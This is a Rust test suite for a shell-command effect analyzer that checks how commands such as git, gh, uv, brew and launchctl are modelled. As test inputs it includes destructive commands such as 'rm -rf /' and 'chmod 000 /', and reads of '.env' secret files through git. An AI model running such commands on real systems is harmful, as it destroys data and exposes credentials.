    }
}

#[test]
fn jq_named_values_and_filter_files_preserve_input_reads() {
    for (argv, reads) in [
        (
            vec!["jq", "--arg", "k", "v", ".x", "f.json"],
            vec!["/work/f.json"],
        ),
        (
            vec![
                "jq",
                "--arg",
                "a",
                "-r",
                "--argjson",
                "b",
                "1",
                ".x",
                "f.json",
            ],
            vec!["/work/f.json"],
        ),
        (
            vec![
                "jq",
                "--rawfile",
                "a",
                "raw.txt",
                "--slurpfile",
                "b",
                "data.json",
                "-f",
                "filter.jq",
                "f.json",
            ],
            vec![
                "/work/raw.txt",
                "/work/data.json",
                "/work/filter.jq",
                "/work/f.json",
            ],
        ),
        (vec!["jq", "-ec", "--indent", "2", ".x"], vec![]),
        (vec!["jq", "--args", ".", "value"], vec![]),
        (vec!["jq", "--jsonargs", ".", "1"], vec![]),
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(
            plan.boundaries.is_empty(),
            "{argv:?}: {:?}",
            plan.boundaries
        );
        let actual = plan
            .effects
            .iter()
            .filter(|e| e.operation.0 == "filesystem.read")
            .map(|e| effinterp_proto::display_resource(&e.resource))
            .collect::<BTreeSet<_>>();
        assert_eq!(
            actual,
            reads.into_iter().map(|path| format!("fs:{path}")).collect(),
            "{argv:?}"
        );
    }
    let plan = analyze(&["jq", "--rawfile", "name"], Some("/work"));
    assert!(has_boundary(&plan, "missing_required_arguments"));
    assert!(
        !plan
            .effects
            .iter()
            .any(|e| e.operation.0 == "filesystem.read")
    );
}

#[test]
fn ci_command_surfaces_keep_file_and_service_effects() {
    {
        let source = "gh api graphql -F number=1";
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/work".into()),
                context: Default::default(),
            })
            .unwrap();
        assert!(
            !has_boundary(&plan, "unrecognized_arguments"),
            "{source}: {:?}",
            plan.boundaries
        );
        assert!(!has_effect(&plan, "filesystem.read", "/work/number=1"));
    }
    let endpoint_plan = Engine::new()
        .analyze(&Subject::Shell {
            source: r#"gh api "$ENDPOINT""#.into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        })
        .unwrap();
    assert!(has_boundary(&endpoint_plan, "unrecognized_arguments"));
    for source in [r#"gh pr "$ACTION""#, r#"gh "$GROUP" list"#] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: None,
                context: Default::default(),
            })
            .unwrap();
        assert!(has_boundary(&plan, "unrecognized_arguments"), "{source}");
    }
    let symbolic = Engine::new()
        .analyze(&Subject::Shell {
            source: r#"gh api endpoint -F body=@"$FILE" -F count=1"#.into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        })
        .unwrap();
    assert!(
        symbolic
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.read"
                && effect.resource
                    == ResourceExpr::Environment {
                        name: "FILE".into()
                    })
    );
    assert!(
        symbolic
            .boundaries
            .iter()
            .any(|b| b.class == BoundaryClass::Unresolved
                && b.domains.contains(&Domain::new("filesystem")))
    );
    for field in ["number=1", "body=@-", "body=@"] {
        let plan = analyze(&["gh", "api", "endpoint", "-F", field], Some("/work"));
        assert!(!has_effect(
            &plan,
            "filesystem.read",
            &format!("/work/{field}")
        ));
        assert!(!has_effect(&plan, "filesystem.read", "/work/-"));
        if field.starts_with("body=@") {
            assert!(
                plan.boundaries
                    .iter()
                    .any(|b| b.class == BoundaryClass::Unresolved
                        && b.domains.contains(&Domain::new("filesystem")))
            );
        }
    }

    let missing_package = analyze(&["uv", "pip", "install"], Some("/work"));
    assert!(has_boundary(&missing_package, "missing_required_arguments"));
    assert!(!missing_package.effects.iter().any(|effect| {
        matches!(
            effect.operation.0.as_str(),
            "network.download" | "filesystem.write"
        )
    }));

    for (argv, operation, resource) in [
        (
            vec!["gh", "api", "endpoint", "-F", "body=@payload.json"],
            "filesystem.read",
            "/work/payload.json",
        ),
        (
            vec!["gh", "release", "upload", "v1", "artifact", "--clobber"],
            "filesystem.read",
            "/work/artifact",
        ),
        (
            vec![
                "gh",
                "api",
                "endpoint",
                "--input",
                "body.json",
                "--jq",
                ".x",
            ],
            "filesystem.read",
            "/work/body.json",
        ),
        (
            vec!["gh", "run", "download", "1", "--pattern", "x", "--dir", "d"],
            "filesystem.write",
            "/work/d",
        ),
        (
            vec!["uv", "pip", "install", "-e", "."],
            "filesystem.read",
            "/work",
        ),
        (
            vec!["uv", "pip", "install", "-e", ".[all]"],
            "filesystem.read",
            "/work",
        ),
        (
            vec!["uv", "pip", "install", "-r", "requirements.txt"],
            "filesystem.read",
            "/work/requirements.txt",
        ),
        (
            vec!["uv", "sync", "--all-extras", "--frozen"],
            "filesystem.write",
            "/work/.venv",
        ),
        (
            vec!["uv", "lock", "--locked"],
            "filesystem.write",
            "/work/uv.lock",
        ),
        (
            vec!["uv", "venv", "env", "--python", "3.11"],
            "filesystem.write",
            "/work/env",
        ),
        (
            vec!["uv", "build", "--repository", "pypi"],
            "filesystem.write",
            "/work/dist",
        ),
        (
            vec!["launchctl", "unload", "p.plist"],
            "filesystem.read",
            "/work/p.plist",
        ),
        (
            vec!["launchctl", "bootstrap", "gui/501", "p.plist"],
            "filesystem.read",
            "/work/p.plist",
        ),
        (
            vec!["launchctl", "bootout", "gui/501", "p.plist"],
            "filesystem.read",
            "/work/p.plist",
        ),
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(
            has_effect(&plan, operation, resource),
            "{argv:?}: {:?}",
            ops(&plan)
        );
        for reason in [
            "unrecognized_arguments",
            "unmodeled_command",
            "unmodeled_subcommand",
        ] {
            assert!(
                !has_boundary(&plan, reason),
                "{argv:?}: {:?}",
                plan.boundaries
            );
        }
        if argv[0] == "gh" {
            assert!(!has_effect(&plan, "filesystem.read", "/work/v1"));
        }
        assert!(!has_effect(&plan, "filesystem.read", "/work/.[all]"));
    }
    for argv in [
        vec!["uv", "python", "install", "3.11"],
        vec!["uv", "python", "find", "3.11"],
        vec!["uv", "python", "list"],
        vec!["uv", "tool", "install", "ruff"],
        vec!["uv", "tool", "run", "rm", "file"],
        vec!["uv", "cache", "prune", "--ci"],
        vec!["uv", "cache", "clean"],
        vec![
            "gh",
            "pr",
            "list",
            "--json",
            "title",
            "--jq",
            ".[].title",
            "--limit",
            "5",
            "--state",
            "open",
        ],
        vec![
            "gh", "pr", "create", "--head", "h", "--base", "b", "--body", "text", "--title",
            "title",
        ],
        vec!["gh", "pr", "merge", "--squash", "--auto", "--delete-branch"],
        vec!["npx", "--yes", "true"],
        vec!["npx", "-y", "true"],
        vec!["mktemp", "-t", "job.XXXXXX"],
        vec!["id", "root"],
        vec!["cat"],
        vec!["cat", "-"],
        vec!["curl", "--retry-delay", "3", "https://example.com"],
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(
            !has_boundary(&plan, "unrecognized_arguments"),
            "{argv:?}: {:?}",
            plan.boundaries
        );
        assert!(!has_boundary(&plan, "unmodeled_command"), "{argv:?}");
        if argv[0] == "cat" {
            assert!(command_effects(&plan).is_empty());
        }
        if argv.starts_with(&["uv", "tool"]) {
            assert!(has_boundary(&plan, "package_scripts"));
        }
    }
    for (command, operation) in [
        ("start", "system.service_start"),
        ("kickstart", "system.service_start"),
        ("stop", "system.service_stop"),
        ("unload", "system.service_disable"),
    ] {
        let plan = analyze(&["launchctl", command, "target"], Some("/work"));
        assert!(plan.effects.iter().any(|e| e.operation.0 == operation));
    }
    for command in ["list", "print"] {
        let plan = analyze(&["launchctl", command], Some("/work"));
        assert!(command_effects(&plan).is_empty());
        assert!(plan.boundaries.is_empty(), "{:?}", plan.boundaries);
    }
}

/// Matches a model application to its id, with or without a pinned revision digest.
fn model_revision_matches(applied: &str, id: &str) -> bool {
    applied
        .strip_prefix(id)
        .is_some_and(|rest| rest.is_empty() || rest.starts_with('#'))
}

/// Upstream Beads and Hermes invocations, plus labeled synthetic edge cases, keep their
/// model-attributed effects and genuine boundaries without argument-surface boundaries.
#[test]
fn upstream_command_cases_keep_model_effects_and_boundaries() {
    let fixture: serde_json::Value = serde_json::from_str(include_str!(
        "../fixtures/model_tranche/upstream_command_cases.json"
    ))
    .unwrap();
    let repositories = fixture["repositories"].as_object().unwrap();
    for repository in repositories.values() {
        assert_eq!(repository["commit"].as_str().unwrap().len(), 40);
        assert!(repository["license"].is_string() && repository["copyright"].is_string());
    }
    let mut upstream_repositories = BTreeSet::new();
    let mut upstream_families = BTreeSet::new();
    for case in fixture["cases"].as_array().unwrap() {
        let name = case["name"].as_str().unwrap();
        let origin = &case["origin"];
        match origin["kind"].as_str().unwrap() {
            "upstream" => {
                let repository = origin["repository"].as_str().unwrap();
                assert!(repositories.contains_key(repository), "{name}");
                let lines = origin["lines"].as_array().unwrap();
                let (first, last) = (lines[0].as_u64().unwrap(), lines[1].as_u64().unwrap());
                let excerpt = origin["excerpt"].as_str().unwrap();
                assert!(!origin["path"].as_str().unwrap().is_empty(), "{name}");
                assert_eq!(excerpt.lines().count() as u64, last - first + 1, "{name}");
                upstream_repositories.insert(repository);
                upstream_families.insert(case["family"].as_str().unwrap());
            }
            "synthetic" => assert!(origin["purpose"].is_string(), "{name}"),
            kind => panic!("{name}: unknown origin {kind}"),
        }

        let subject: Subject = serde_json::from_value(case["subject"].clone()).unwrap();
        let plan = Engine::new().analyze(&subject).unwrap();
        validate_plan(&plan).unwrap_or_else(|e| panic!("{name}: invalid plan: {e:?}"));
        assert!(
            !plan.effects.is_empty() || !plan.boundaries.is_empty(),
            "{name}: silent plan"
        );
        let strings = |key: &str| {
            case[key]
                .as_array()
                .map(|values| values.iter().map(|v| v.as_str().unwrap()).collect())
                .unwrap_or_else(Vec::new)
        };
        let model = case["model"].as_str();
        // An effect is attributed to the model when the model application is among its
        // provenance antecedents.
        let applies_model = |refs: &[effinterp_proto::ProvenanceRef]| {
            let mut pending = refs.to_vec();
            let mut seen = BTreeSet::new();
            while let Some(reference) = pending.pop() {
                if !seen.insert(reference.0) {
                    continue;
                }
                let node = &plan.provenance[reference.0 as usize];
                if let ProvenanceKind::ModelApplication { model: applied } = &node.kind
                    && model.is_some_and(|id| model_revision_matches(applied, id))
                {
                    return true;
                }
                pending.extend(node.antecedents.iter().cloned());
            }
            false
        };
        if let Some(id) = model {
            assert!(
                command_model_provenance(&plan)
                    .iter()
                    .any(|applied| model_revision_matches(applied, id)),
                "{name}: {id} not applied: {:?}",
                command_model_provenance(&plan)
            );
        }
        let rendered = || {
            plan.effects
                .iter()
                .map(|e| {
                    let resource = effinterp_proto::display_resource(&e.resource);
                    (
                        e.operation.0.as_str(),
                        resource,
                        applies_model(&e.provenance),
                    )
                })
                .collect::<Vec<_>>()
        };
        for expected in case["effects"].as_array().into_iter().flatten() {
            let operation = expected["operation"].as_str().unwrap();
            let resource = expected["resource"].as_str();
            assert!(
                plan.effects.iter().any(|e| {
                    e.operation.0 == operation
                        && resource.is_none_or(|resource| {
                            effinterp_proto::display_resource(&e.resource) == resource
                        })
                        && (model.is_none() || applies_model(&e.provenance))
                }),
                "{name}: missing {operation} {resource:?}: {:?}",
                rendered()
            );
        }
        for operation in strings("absent_operations") {
            assert!(
                !plan.effects.iter().any(|e| e.operation.0 == operation),
                "{name}: unexpected {operation}: {:?}",
                rendered()
            );
        }
        if case["model_inert"].as_bool().unwrap_or(false) {
            assert!(
                !plan.effects.iter().any(|e| applies_model(&e.provenance)),
                "{name}: inert model emitted {:?}",
                rendered()
            );
        }
        for reason in strings("boundaries") {
            assert!(
                has_boundary(&plan, reason),
                "{name}: missing {reason}: {:?}",
                plan.boundaries
            );
        }
        for reason in strings("absent_boundaries") {
            assert!(
                !has_boundary(&plan, reason),
                "{name}: unexpected {reason}: {:?}",
                plan.boundaries
            );
        }
    }
    assert_eq!(upstream_repositories, BTreeSet::from(["beads", "hermes"]));
    assert_eq!(
        upstream_families,
        BTreeSet::from([
            "cat",
            "curl",
            "gh",
            "id",
            "jq",
            "launchctl",
            "mktemp",
            "npx",
            "uv"
        ])
    );
}

#[test]
fn git_read_verbs_and_archive_output_are_modeled() {
    for (mode, object) in [
        ("blob", "HEAD:.env"),
        ("-p", "main:config/settings"),
        ("blob", "deadbeef"),
    ] {
        let plan = analyze(
            &["git", "-C", "/repo", "cat-file", mode, object],
            Some("/w"),
        );
        let read = plan
            .effects
            .iter()
            .find(|e| e.operation.0 == "git.read")
            .unwrap();
        assert!(has_effect(&plan, "git.read", "/repo"));
        assert_eq!(
            read.attributes.get("object"),
            Some(&AttrValue::String(object.into()))
        );
        assert_eq!(
            read.attributes.get("mode"),
            Some(&AttrValue::String(mode.into()))
        );
        assert_eq!(
            read.attributes.get("output"),
            Some(&AttrValue::String("stdout".into()))
        );
        assert!(read.provenance.iter().any(|node| matches!(
            plan.provenance[node.0 as usize].kind,
            ProvenanceKind::Argument { index: 5 }
        )));
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0 == "filesystem.read")
        );
        if let Some((revision, path)) = object.split_once(':') {
            for (key, value) in [("revision", revision), ("path", path)] {
                assert_eq!(
                    read.attributes.get(key),
                    Some(&AttrValue::String(value.into()))
                );
            }
            assert_eq!(
                read.attributes.get("historical"),
                Some(&AttrValue::Bool(true))
            );
        }
        assert!(plan.boundaries.is_empty());
    }
    for mode in ["-t", "-s", "-e"] {
        let plan = analyze(&["git", "cat-file", mode, "HEAD:config"], Some("/w"));
        let read = plan
            .effects
            .iter()
            .find(|e| e.operation.0 == "git.read")
            .unwrap();
        assert!(!read.attributes.contains_key("output"));
        assert_eq!(
            read.attributes.get("disclosure"),
            Some(&AttrValue::String("metadata".into()))
        );
    }
    for (verb, mode, object, path, disclosure) in [
        ("cat-file", Some("blob"), "HEAD:.env", ".env", "contents"),
        ("cat-file", Some("-p"), "HEAD:./.env", "./.env", "contents"),
        (
            "cat-file",
            Some("-t"),
            "HEAD:../.env",
            "../.env",
            "metadata",
        ),
        ("cat-file", Some("-s"), "main:.env", ".env", "metadata"),
        ("show", None, "HEAD:.env", ".env", "contents"),
        ("show", None, "HEAD:./.env", "./.env", "contents"),
        (
            "show",
            None,
            "HEAD@{2026-09-20 12:30:00}:.env",
            ".env",
            "contents",
        ),
    ] {
        let mut argv = vec!["git", "--work-tree=/repo", "-C", "/repo/sub", verb];
        argv.extend(mode);
        argv.push(object);
        let plan = analyze(&argv, Some("/elsewhere"));
        let read = plan
            .effects
            .iter()
            .find(|e| e.operation.0 == "git.read")
            .unwrap();
        for (key, value) in [
            ("path", path),
            ("revision", object.rsplit_once(':').unwrap().0),
            ("disclosure", disclosure),
        ] {
            assert_eq!(
                read.attributes.get(key),
                Some(&AttrValue::String(value.into())),
                "{argv:?}: {key}"
            );
        }
        assert_eq!(
            read.attributes.get("historical"),
            Some(&AttrValue::Bool(true))
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0 == "filesystem.read")
        );
    }
    // A pathspec-scoped read prints that path's file content, so the path has
    // to survive on git.read the way an object selector's does. Without it a
    // consumer sees only "this repository was read" and cannot tell which
    // file was printed. Forms that print no file content must not claim one.
    for (argv, path, historical) in [
        (["git", "diff", "--", ".env"].as_slice(), ".env", false),
        (
            ["git", "diff", "HEAD~1", "--", ".env"].as_slice(),
            ".env",
            true,
        ),
        (
            ["git", "diff", "--cached", "--", ".env"].as_slice(),
            ".env",
            true,
        ),
        (["git", "log", "-p", "--", ".env"].as_slice(), ".env", true),
        (["git", "blame", ".env"].as_slice(), ".env", true),
        (
            ["git", "blame", "HEAD", "--", ".env"].as_slice(),
            ".env",
            true,
        ),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(has_effect(&plan, "git.read", "/w"), "{argv:?}");
        for (key, value) in [("path", path), ("disclosure", "contents")] {
            assert_eq!(
                attr(&plan, "git.read", key),
                Some(AttrValue::String(value.into())),
                "{argv:?}: {key}"
            );
        }
        assert_eq!(
            attr(&plan, "git.read", "historical"),
            Some(AttrValue::Bool(historical)),
            "{argv:?}"
        );
    }
    for argv in [
        ["git", "log", "--", ".env"].as_slice(),
        ["git", "diff", "--stat", "--", ".env"].as_slice(),
        ["git", "diff", "-s", "--", ".env"].as_slice(),
        ["git", "log", "-p", "--name-only", "--", ".env"].as_slice(),
        ["git", "diff", "--cached"].as_slice(),
        ["git", "blame", "HEAD", ".env"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(has_effect(&plan, "git.read", "/w"), "{argv:?}");
        assert_eq!(attr(&plan, "git.read", "path"), None, "{argv:?}");
    }

    let chained = analyze(
        &["git", "-C", "/repo", "-C", "sub", "show", "HEAD:./.env"],
        Some("/w"),
    );
    assert_eq!(
        attr(&chained, "git.read", "path"),
        Some(AttrValue::String("./.env".into()))
    );
    assert!(
        !chained
            .effects
            .iter()
            .any(|e| e.operation.0 == "filesystem.read")
    );
    for object in [":.env", ":0:.env", ":/message", "HEAD:", "HEAD:/absolute"] {
        let plan = analyze(&["git", "cat-file", "-p", object], Some("/w"));
        assert_eq!(
            attr(&plan, "git.read", "object"),
            Some(AttrValue::String(object.into()))
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0 == "filesystem.read"),
            "{object}"
        );
    }
    for mode in [
        "--batch",
        "--batch-check",
        "--batch=%(objectname)",
        "--batch-command",
    ] {
        let plan = analyze(&["git", "cat-file", mode], Some("/w"));
        assert_eq!(plan.boundaries.len(), 1);
        assert!(has_boundary(&plan, "input_determined_arguments"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| matches!(e.operation.0.as_str(), "filesystem.read" | "git.read"))
        );
    }
    {
        use effinterp_engine::{
            SourceRefusal, SourceRequest, SourceResolver, SourceResponse, UnavailableReason,
        };
        struct Repository;
        impl SourceResolver for Repository {
            fn resolve(&self, request: SourceRequest<'_>) -> SourceResponse {
                if request.path == "/repo/.git/HEAD" {
                    SourceResponse::Source(b"ref: refs/heads/main\n".to_vec())
                } else {
                    SourceResponse::Refused(SourceRefusal::Unavailable(UnavailableReason::Missing))
                }
            }
            fn siblings(&self, _: &str) -> Option<Vec<String>> {
                None
            }
        }
        let plan = Engine::new()
            .with_resolver(Box::new(Repository))
            .analyze(&Subject::Shell {
                source: "git show HEAD:.env > .env".into(),
                cwd: Some("/repo/sub".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0 == "filesystem.read")
        );
        assert!(has_effect(&plan, "filesystem.write", "/repo/sub/.env"));
        assert_eq!(
            attr(&plan, "git.read", "path"),
            Some(AttrValue::String(".env".into()))
        );
        let bare = Engine::new()
            .with_resolver(Box::new(Repository))
            .analyze(&Subject::Shell {
                source: "git --bare show HEAD:.env".into(),
                cwd: Some("/repo/sub".into()),
                context: Default::default(),
            })
            .unwrap();
        assert!(!has_effect(&bare, "filesystem.read", "/repo/.env"));
        assert!(
            !bare
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.read")
        );
        assert_eq!(
            attr(&bare, "git.read", "path"),
            Some(AttrValue::String(".env".into()))
        );
    }
    // Regression: the historical content git prints had no causal edge to
    // stdout, so `git show REV:PATH > PATH` never showed that the redirection
    // writes the recorded content back over the working-tree file.
    for source in [
        "git show main:src/lib.rs > src/lib.rs",
        "git cat-file -p HEAD:src/lib.rs > src/lib.rs",
    ] {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        let graph = plan.causality.graph.as_ref().unwrap();
        assert!(graph.edges.iter().any(|edge| {
            graph.nodes.iter().any(|node| node.id == edge.from && matches!(&node.occurrence, effinterp_proto::OccurrenceKind::ResourceInteraction { operation, .. } if operation.0 == "git.read"))
                && graph.nodes.iter().any(|node| node.id == edge.to && matches!(&node.occurrence, effinterp_proto::OccurrenceKind::Port { port: effinterp_proto::Port::Stdout }))
        }), "{source}: {graph:#?}");
    }
    for args in [
        vec!["--filters", "HEAD:config"],
        vec!["--batch"],
        vec!["-p", "--help"],
        vec!["blob", "HEAD:config", "extra"],
    ] {
        let mut argv = vec!["git", "cat-file"];
        argv.extend(args);
        let plan = analyze(&argv, Some("/w"));
        assert!(!plan.boundaries.is_empty());
        assert!(!plan.effects.iter().any(|e| e.operation.0 == "git.read"));
        if argv.contains(&"--filters") {
            assert_eq!(
                plan.coverage.level(&Domain::new("process")),
                Some(CoverageLevel::Partial)
            );
        }
    }
    let dynamic = Engine::new()
        .analyze(&Subject::Shell {
            source: "git cat-file blob \"$OBJECT\"".into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&dynamic).unwrap();
    assert_eq!(dynamic.boundaries.len(), 1);
    assert_eq!(dynamic.boundaries[0].reason.as_str(), "dynamic_source");
    assert!(!dynamic.effects.iter().any(|e| e.operation.0 == "git.read"));
    for args in [
        &["merge-base", "HEAD", "origin/main"][..],
        &["merge-base", "--is-ancestor", "HEAD", "origin/main"][..],
        &["ls-tree", "-rz", "HEAD"][..],
        &["diff-tree", "--no-commit-id", "--name-only", "-r", "HEAD"][..],
        &["show-ref", "--verify", "refs/heads/main"][..],
    ] {
        let mut argv = vec!["git", "-C", "/repo"];
        argv.extend_from_slice(args);
        let plan = analyze(&argv, Some("/w"));
        assert!(has_effect(&plan, "git.read", "/repo"), "{argv:?}");
        assert!(
            plan.boundaries.is_empty(),
            "{argv:?}: {:?}",
            plan.boundaries
        );
    }
    let plan = analyze(
        &["git", "diff-tree", "--output=changes", "HEAD"],
        Some("/w"),
    );
    assert!(!plan.boundaries.is_empty());
    for output in [
        &["-o", "out.tar"][..],
        &["-oout.tar"][..],
        &["--output=out.tar"][..],
    ] {
        let mut argv = vec!["git", "-C", "/repo", "archive", "HEAD"];
        argv.extend_from_slice(output);
        let plan = analyze(&argv, Some("/w"));
        assert!(has_effect(&plan, "filesystem.write", "/repo/out.tar"));
        assert!(plan.boundaries.is_empty());
    }
    let plan = analyze(&["git", "archive", "HEAD"], Some("/w"));
    assert!(has_effect(&plan, "git.read", "/w"));
    assert!(
        !plan
            .effects
            .iter()
            .any(|e| e.operation.0 == "filesystem.write")
    );
    for argv in [
        &["git", "archive", "--output"][..],
        &["git", "archive", "--future", "out.tar", "HEAD"][..],
        &["git", "archive", "--remote=host", "HEAD"][..],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(!plan.boundaries.is_empty());
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0 == "filesystem.write")
        );
    }
}

#[test]
fn psql_connection_has_postgresql_scheme() {
    let mysql = analyze(&["mysql", "-h", "db.example", "-e", "SELECT 1"], Some("/w"));
    assert!(!mysql.effects.iter().any(|effect| matches!(&effect.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::NetworkEndpoint { scheme: Some(scheme), .. } }
        if scheme == "postgresql")));
    let plan = analyze(&["psql", "-h", "db.example", "-c", "SELECT 1"], Some("/w"));
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "network.connect"
                && matches!(&effect.resource, ResourceExpr::Concrete {
            identity: ResourceIdentity::NetworkEndpoint { host, scheme: Some(scheme), .. }
        } if host == "db.example" && scheme == "postgresql"))
    );
}

#[test]
fn catalog_effects_have_computed_coverage() {
    let catalog = effinterp_engine::Catalog::builtin();
    for model in catalog.models() {
        for name in model.command_names() {
            assert_eq!(catalog.find(name).unwrap().id(), model.id(), "{name}");
            for argv in [vec![*name], vec![*name, "--definitely-unknown-flag"]] {
                let plan = analyze(&argv, None);
                for effect in &plan.effects {
                    let domain = effect.operation.domain();
                    assert!(
                        plan.coverage.level(&Domain::new(domain)).is_some(),
                        "{} {argv:?}: missing coverage for {domain}",
                        model.id()
                    );
                }
            }
        }
    }
}

#[test]
fn developer_commands_distinguish_read_only_and_mutating_modes() {
    for (argv, writes) in [
        (vec!["gofmt", "-l", "."], false),
        (vec!["gofmt", "main.go"], false),
        (vec!["gofmt", "-w", "main.go"], true),
        (vec!["eslint", "src"], false),
        (vec!["eslint"], false),
        (vec!["eslint", "--fix"], true),
        (vec!["eslint", "--fix-dry-run"], false),
        (vec!["eslint", "--fix", "--fix-dry-run"], false),
        (vec!["eslint", "--fix", "src"], true),
        (vec!["eslint", "--fix-dry-run", "src"], false),
        (vec!["prettier", "--check", "src"], false),
        (vec!["prettier", "--write", "src"], true),
        (vec!["tsc", "--noEmit", "-p", "."], false),
        (vec!["tsc", "-p", "."], true),
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(
            plan.effects
                .iter()
                .any(|e| e.operation.0 == "filesystem.read"),
            "{argv:?}"
        );
        assert_eq!(
            plan.effects
                .iter()
                .any(|e| e.operation.0 == "filesystem.write"),
            writes,
            "{argv:?}"
        );
        assert!(
            !plan
                .boundaries
                .iter()
                .any(|b| b.reason.as_str() == "unmodeled_command"),
            "{argv:?}"
        );
    }
    let pytest = analyze(&["pytest", "tests/", "-x", "-q"], Some("/work"));
    assert!(has_effect(&pytest, "filesystem.read", "/work/tests"));
    assert!(
        pytest
            .effects
            .iter()
            .any(|e| e.operation.0 == "process.code_execution")
    );
    let comm = analyze(&["comm", "-12", "left", "right"], Some("/work"));
    assert!(has_effect(&comm, "filesystem.read", "/work/left"));
    assert!(has_effect(&comm, "filesystem.read", "/work/right"));
}

#[test]
fn dolt_config_queries_and_version_do_not_write() {
    for argv in [
        vec!["dolt", "version"],
        vec!["dolt", "config", "--global", "--get", "user.name"],
        vec!["dolt", "config", "--global", "--list"],
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0 == "filesystem.write"),
            "{argv:?}"
        );
    }
    let local = analyze(
        &["dolt", "config", "--local", "--add", "user.name", "Test"],
        Some("/work"),
    );
    assert!(has_effect(&local, "filesystem.write", "/work/.dolt"));
    let global = analyze(
        &["dolt", "config", "--global", "--add", "user.name", "Test"],
        Some("/work"),
    );
    let resource = &global
        .effects
        .iter()
        .find(|e| e.operation.0 == "filesystem.write")
        .unwrap()
        .resource;
    let json = serde_json::to_string(resource).unwrap();
    assert!(json.contains("HOME") && json.contains(".dolt"));
    assert!(!has_effect(&global, "filesystem.write", "/work/.dolt"));
}

// Package mutations must survive subcommand selection, while unsupported verbs
// must not invent downloads, writes, deletes, or service effects.
#[test]
fn brew_subcommand_effects_and_unknown_boundary() {
    for (command, operation) in [
        ("install", "filesystem.write"),
        ("reinstall", "filesystem.write"),
        ("upgrade", "filesystem.write"),
        ("tap", "filesystem.write"),
        ("update", "filesystem.write"),
        ("install-bundler-gems", "filesystem.write"),
        ("bundle", "filesystem.write"),
        ("uninstall", "filesystem.delete"),
        ("untap", "filesystem.delete"),
        ("cleanup", "filesystem.delete"),
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Exec {
                argv: vec!["brew".into(), command.into(), "ripgrep".into()],
                cwd: Some("/work".into()),
                context: HostContext {
                    env: std::collections::BTreeMap::from([(
                        "HOMEBREW_PREFIX".into(),
                        "/opt/homebrew".into(),
                    )]),
                    ..Default::default()
                },
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(plan.effects.iter().any(|e| e.operation.0 == operation && matches!(&e.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/opt/homebrew")), "{command}: {:?}", plan.effects);
        if operation == "filesystem.write" {
            assert!(
                plan.effects
                    .iter()
                    .any(|e| e.operation.0 == "network.download")
            );
            assert!(
                plan.boundaries
                    .iter()
                    .any(|b| b.reason == "package_scripts")
            );
        }
    }
    for verb in ["start", "stop"] {
        let plan = analyze(&["brew", "services", verb, "postgresql"], Some("/work"));
        assert!(
            plan.effects
                .iter()
                .any(|e| e.operation.0 == format!("system.service_{verb}"))
        );
    }
    for args in [
        vec!["brew", "frobnicate"],
        vec!["brew", "services", "frobnicate"],
    ] {
        let plan = analyze(&args, Some("/work"));
        assert!(
            plan.boundaries
                .iter()
                .any(|b| b.reason == "unmodeled_subcommand")
        );
        assert!(command_effects(&plan).is_empty());
    }
    for verb in [
        "style",
        "typecheck",
        "audit",
        "readall",
        "config",
        "list",
        "info",
        "deps",
        "--prefix",
        "--cellar",
    ] {
        let plan = analyze(&["brew", verb], Some("/work"));
        assert!(command_effects(&plan).is_empty(), "{verb}");
        assert!(!plan.boundaries.iter().any(|b| b.reason == "unmodeled_subcommand" || b.reason == "unrecognized_arguments"), "{verb}");
    }
}

#[test]
fn builtin_help_and_version_do_not_act_but_separator_operands_do() {
    for (argv, operation, acts) in [
        (vec!["rm", "-rf", "/", "--help"], "filesystem.delete", false),
        (
            vec!["rm", "--version", "/tmp/data"],
            "filesystem.delete",
            false,
        ),
        (
            vec!["rm", "-rf", "--", "/tmp/data", "--help"],
            "filesystem.delete",
            true,
        ),
        (vec!["chmod", "--help", "/"], "filesystem.metadata", false),
        (
            vec!["chmod", "--version", "000", "/"],
            "filesystem.metadata",
            false,
        ),
        (vec!["chmod", "--", "000", "/"], "filesystem.metadata", true),
        (
            vec!["link", "--help", "secret", "alias"],
            "filesystem.create",
            false,
        ),
        (vec!["link", "secret", "alias"], "filesystem.create", true),
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Exec {
                argv: argv.iter().map(|arg| (*arg).to_owned()).collect(),
                cwd: Some("/repo".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(
            plan.boundaries.is_empty(),
            "{argv:?}: {:?}",
            plan.boundaries
        );
        assert_eq!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == operation),
            acts,
            "{argv:?}"
        );
    }
}
